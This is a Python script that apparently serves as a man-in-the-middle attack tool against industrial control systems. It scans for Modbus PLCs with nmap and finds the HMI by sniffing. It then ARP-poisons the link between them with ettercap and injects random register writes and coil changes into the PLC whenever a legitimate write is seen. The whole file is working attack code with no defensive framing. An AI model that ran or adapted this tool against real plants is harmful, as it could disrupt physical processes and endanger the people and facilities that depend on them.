import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md
from time import *
from scapy.all import *
from random import *
import os, nmap

#start = time.perf_counter()
#plc = mt.TcpMaster('10.55.0.6', 502)
plc_ip = ''
hmi_ip = ''

def changeData_reg(plc):
        plc = mt.TcpMaster(plc, 502)
        i = randrange(100, 109)
        q = randrange(1, 500)
        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=i, quantity_of_x=1, output_value=[q])

def changeData0(plc):
        plc = mt.TcpMaster(plc, 502)
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=0)

def changeData1(plc):
        plc = mt.TcpMaster(plc, 502)
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=1)

def scan():
        nm = nmap.PortScanner()
        net = input("enter your network : ")
        nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
        hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
        for host, state in hosts_list:
            if state == 'open':
                global plc_ip
                plc_ip = host
                print("PLC IP : {}".format(plc_ip))

def psniff(plcip):
        fil = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plcip)
        p = sniff(iface="eth0", count=1, filter=fil)
        x = p[0]
        global hmi_ip
        hmi_ip = x[IP].src
        print("HMI IP : {}".format(hmi_ip))

def get_ip():
        scan()
        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
        process = os.popen('pgrep -f ettercap')
        out = process.read()
        process.close()
        print("ettercap is running, PID : {}".format(out))
        os.system(arp1)
        psniff(plc_ip)

def arp_spoofing():
        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{plc}// /{hmi}// >/dev/null 2>&1 &'.format(plc=plc_ip, hmi=hmi_ip)
        os.system(arp2)
        print("ARP Poisoning start !!")
        sleep(4)

def cap():
        while True:
                xx = 1
                while xx:
                        pp = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plc_ip)
                        plc_frames = sniff(iface="eth0", count=1, filter=pp)
                        modbus_query = plc_frames[0]
                        st = str(modbus_query[Raw].load)
                        try:
                                if "\\x01\\x10\\x00" in st:
                                        changeData_reg(plc_ip)
                                        xx = 0
                                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                elif st[-9: -1] == "\\xff\\x00":
                                        changeData0(plc_ip)
                                        xx = 0
                                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                elif st[-9: -1] == "\\x00\\x00":
                                        changeData1(plc_ip)
                                        xx = 0
                                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                        except:
                                xx = 1

def main():
        get_ip()
        arp_spoofing()
        cap()

main()
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
